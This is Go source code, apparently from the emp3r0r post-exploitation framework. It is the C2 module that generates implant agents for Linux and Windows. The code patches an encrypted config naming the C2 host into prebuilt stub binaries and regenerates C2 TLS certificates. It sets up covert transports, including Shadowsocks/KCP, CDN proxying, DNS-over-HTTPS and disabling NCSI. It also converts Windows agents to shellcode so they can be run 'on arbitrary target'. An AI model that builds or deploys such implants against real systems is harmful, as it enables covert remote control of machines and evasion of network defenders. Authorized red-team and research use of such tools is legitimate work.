//go:build linux
// +build linux

package cc

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

const (
	PayloadTypeLinuxExecutable   = "linux_executable"
	PayloadTypeWindowsExecutable = "windows_executable"
	PayloadTypeWindowsDLL        = "windows_dll"
	PayloadTypeLinuxSO           = "linux_so"
)

var PayloadTypeList = []string{
	PayloadTypeLinuxExecutable,
	PayloadTypeLinuxSO,
	PayloadTypeWindowsExecutable,
	PayloadTypeWindowsDLL,
}

var Arch_List_Windows = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Windows_DLL = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Linux_SO = []string{
	"amd64",
	"386",
	"arm",
	"riscv64",
}

var Arch_List_All = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

func modGenAgent() {
	var (
		outfile     string // write agent binary to this path
		arch_choice string // CPU architecture
	)
	now := time.Now()
	stubFile := ""
	payloadTypeOpt, ok := CurrentModuleOptions["payload_type"]
	if !ok {
		CliPrintError("Option 'type' not found")
		return
	}
	payload_type := payloadTypeOpt.Val

	archOpt, ok := CurrentModuleOptions["arch"]
	if !ok {
		CliPrintError("Option 'arch' not found")
		return
	}
	arch_choice = archOpt.Val

	if !isArchValid(payload_type, arch_choice) {
		CliPrintError("Invalid arch choice")
		return
	}

	stubFile, outfile = generateFilePaths(payload_type, arch_choice, now)

	// is this stub file available?
	if !util.IsExist(stubFile) {
		CliPrintError("%s not found, build it first", stubFile)
		return
	}

	// fill emp3r0r.json
	if err := MakeConfig(); err != nil {
		CliPrintError("Failed to configure agent: %v", err)
		return
	}

	// read and encrypt config file
	encryptedJSONBytes, err := readAndEncryptConfig()
	if err != nil {
		CliPrintError("Failed to encrypt %s: %v", EmpConfigFile, err)
		return
	}

	// read stub file
	toWrite, err := os.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	sep := bytes.Repeat(emp3r0r_def.OneTimeMagicBytes, 2)

	// payload
	config_payload := append(sep, encryptedJSONBytes...)
	config_payload = append(config_payload, sep...)
	// binary patching, we need to patch the stub file at emp3r0r_def.AgentConfig, which is 4096 bytes long
	if len(config_payload) < len(emp3r0r_def.AgentConfig) {
		// pad with 0x00
		config_payload = append(config_payload, bytes.Repeat([]byte{0x00}, len(emp3r0r_def.AgentConfig)-len(config_payload))...)
	} else if len(config_payload) > len(emp3r0r_def.AgentConfig) {
		CliPrintError("Config payload is too large, %d bytes, max %d bytes", len(config_payload), len(emp3r0r_def.AgentConfig))
		return
	}
	// fill in
	toWrite = bytes.Replace(toWrite,
		// by now config_payload should be 4096 bytes long
		bytes.Repeat([]byte{0xff}, len(config_payload)),
		config_payload,
		1)
	// verify
	if !bytes.Contains(toWrite, config_payload) {
		CliPrintWarning("Failed to patch %s with config payload, config data not found, append it to the file instead", stubFile)
		// append config to the end of the file
		err = appendConfigToPayload(stubFile, sep, encryptedJSONBytes)
		if err != nil {
			CliPrintError("Failed to append config to payload: %v", err)
			return
		}
	}
	// write
	if err = os.WriteFile(outfile, toWrite, 0o755); err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, EmpConfigFile, outfile)
	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_def.OneTimeMagicBytes)

	if payload_type == PayloadTypeWindowsExecutable {
		// generate shellcode for the agent binary
		DonoutPE2Shellcode(outfile, arch_choice)
	}
	if payload_type == PayloadTypeLinuxExecutable {
		// tell user to use shared library stager
		CliPrint("Use `stager` module to create a shared library that delivers the agent with encryption and compression. You will need another stager to load the shared library.")
	}
}

func isArchValid(payload_type, arch_choice string) bool {
	var list []string
	switch payload_type {
	case PayloadTypeWindowsExecutable:
		list = Arch_List_Windows
	case PayloadTypeWindowsDLL:
		list = Arch_List_Windows_DLL
	case PayloadTypeLinuxSO:
		list = Arch_List_Linux_SO
	default:
		list = Arch_List_All
	}
	for _, a := range list {
		if arch_choice == a {
			return true
		}
	}
	return false
}

func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFile, outfile string) {
	switch payload_type {
	case PayloadTypeLinuxExecutable:
		CliPrintInfo("You chose Linux Executable")
		stubFile = fmt.Sprintf("stub-%s", arch_choice)
		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case PayloadTypeWindowsExecutable:
		CliPrintInfo("You chose Windows Executable")
		stubFile = fmt.Sprintf("stub-win-%s", arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case PayloadTypeWindowsDLL:
		CliPrintInfo("You chose Windows DLL")
		stubFile = fmt.Sprintf("stub-win-%s.dll", arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case PayloadTypeLinuxSO:
		CliPrintInfo("You chose Linux SO")
		stubFile = fmt.Sprintf("stub-%s.so", arch_choice)
		outfile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	default:
		CliPrintError("Unsupported: %s", payload_type)
	}
	return
}

func readAndEncryptConfig() ([]byte, error) {
	// read file
	jsonBytes, err := os.ReadFile(EmpConfigFile)
	if err != nil {
		return nil, fmt.Errorf("parsing EmpConfigFile config file: %v", err)
	}

	// encrypt
	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_def.OneTimeMagicBytes, jsonBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt %s: %v", EmpConfigFile, err)
	}

	return encryptedJSONBytes, nil
}

func appendConfigToPayload(file string, sep, config []byte) (err error) {
	bin_data, err := os.ReadFile(file)
	if err != nil {
		err = fmt.Errorf("failed to read file %s: %v", file, err)
		return
	}
	toWrite := append(bin_data, sep...)
	toWrite = append(toWrite, config...)
	toWrite = append(toWrite, sep...)
	err = os.WriteFile(file, toWrite, 0o755)
	if err != nil {
		err = fmt.Errorf("failed to save final agent binary: %v", err)
		return
	}

	return
}

func MakeConfig() (err error) {
	// read existing config when possible
	var (
		jsonData   []byte
		config_map map[string]interface{}
	)
	if util.IsExist(EmpConfigFile) {
		CliPrintInfo("Reading config from existing %s", EmpConfigFile)
		jsonData, err = os.ReadFile(EmpConfigFile)
		if err != nil {
			CliPrintWarning("failed to read %s: %v", EmpConfigFile, err)
		}
		// load to map
		err = json.Unmarshal(jsonData, &config_map)
		if err != nil {
			CliPrintWarning("Parsing existing %s: %v", EmpConfigFile, err)
		}
	}

	// CC names and certs
	ccHostOpt, ok := CurrentModuleOptions["cc_host"]
	if !ok {
		CliPrintError("Option 'cc_host' not found")
		return fmt.Errorf("option 'cc_host' not found")
	}
	RuntimeConfig.CCHost = ccHostOpt.Val
	existing_names := tun.NamesInCert(ServerCrtFile)
	cc_hosts := existing_names
	exists := false
	for _, c2_name := range existing_names {
		if c2_name == RuntimeConfig.CCHost {
			exists = true
			break
		}
	}
	// if user is requesting a new server name, server cert needs to be re-generated
	if !exists {
		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
			RuntimeConfig.CCHost)
		cc_hosts = append(cc_hosts, RuntimeConfig.CCHost) // append new name
		// remove old certs
		os.RemoveAll(ServerCrtFile)
		os.RemoveAll(ServerKeyFile)
		err = GenC2Certs(cc_hosts)
		if err != nil {
			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
		}
		err = EmpTLSServer.Shutdown(EmpTLSServerCtx)
		if err != nil {
			CliPrintError("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
				err, RuntimeConfig.CCHost)
		} else {
			CliPrintWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)

			c2_names := tun.NamesInCert(ServerCrtFile)
			if len(c2_names) <= 0 {
				CliFatalError("C2 has no names?")
			}
			name_list := strings.Join(c2_names, ", ")
			CliPrintInfo("Updated C2 server names: %s", name_list)
			go TLSServer()
		}
	}

	// CC indicator
	ccIndicatorOpt, ok := CurrentModuleOptions["cc_indicator"]
	if !ok {
		CliPrintError("Option 'cc_indicator' not found")
		return fmt.Errorf("option 'cc_indicator' not found")
	}
	RuntimeConfig.CCIndicator = ccIndicatorOpt.Val

	indicatorTextOpt, ok := CurrentModuleOptions["indicator_text"]
	if !ok {
		CliPrintError("Option 'indicator_text' not found")
		return fmt.Errorf("option 'indicator_text' not found")
	}
	RuntimeConfig.CCIndicatorText = indicatorTextOpt.Val
	if RuntimeConfig.CCIndicatorText != "" {
		CliMsg("Remember to put text %s in your indicator (%s) response",
			strconv.Quote(RuntimeConfig.CCIndicatorText), RuntimeConfig.CCIndicator)
	}

	ncsiOpt, ok := CurrentModuleOptions["ncsi"]
	if !ok {
		CliPrintError("Option 'ncsi' not found")
		return fmt.Errorf("option 'ncsi' not found")
	}
	if ncsiOpt.Val == "on" {
		RuntimeConfig.DisableNCSI = false
	} else {
		RuntimeConfig.DisableNCSI = true
	}

	// CDN proxy
	RuntimeConfig.CDNProxy = CurrentModuleOptions["cdn_proxy"].Val

	// shadowsocks and kcp
	RuntimeConfig.UseShadowsocks = CurrentModuleOptions["shadowsocks"].Val == "on" || CurrentModuleOptions["shadowsocks"].Val == "bare"
	RuntimeConfig.UseKCP = CurrentModuleOptions["shadowsocks"].Val != "bare" && RuntimeConfig.UseShadowsocks

	// agent proxy for c2 transport
	RuntimeConfig.C2TransportProxy = CurrentModuleOptions["c2transport_proxy"].Val
	RuntimeConfig.AutoProxyTimeout, err = strconv.Atoi(CurrentModuleOptions["autoproxy_timeout"].Val)
	if err != nil {
		CliPrintWarning("Parsing autoproxy_timeout: %v. Setting to 0.", err)
		RuntimeConfig.AutoProxyTimeout = 0
	}
	RuntimeConfig.DoHServer = CurrentModuleOptions["doh_server"].Val
	if CurrentModuleOptions["auto_proxy"].Val == "on" {
		RuntimeConfig.BroadcastIntervalMax = 120
	} else {
		RuntimeConfig.BroadcastIntervalMax = 0
	}

	// save emp3r0r.json
	return save_config_json()
}
